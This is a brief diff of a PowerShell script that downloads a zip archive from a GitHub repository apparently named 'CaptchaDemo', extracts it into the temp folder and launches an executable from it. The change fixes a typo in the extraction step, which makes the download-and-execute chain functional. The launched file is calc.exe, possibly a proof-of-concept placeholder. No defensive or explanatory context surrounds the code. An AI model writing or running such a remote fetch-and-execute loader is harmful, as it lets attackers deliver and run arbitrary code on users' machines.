@@ -3,5 +3,5 @@ $url1 = "https://github.com/DamnIt74/CaptchaDemo/blob/65314d1f4822742fd6cf567f8a
 $zipPath1 = "$env:TEMP\pgrt1.zip"
 $webClient.DownloadFile($url1, $zipPath1)
 $extractPath1 = "$env:TEMP\file"
-Expand-Archive -Path $zip.Path1 -DestinationPath $extractPath1
+Expand-Archive -Path $zipPath1 -DestinationPath $extractPath1
 Start-Process -FilePath $env:\TEMP\file\calc.exe
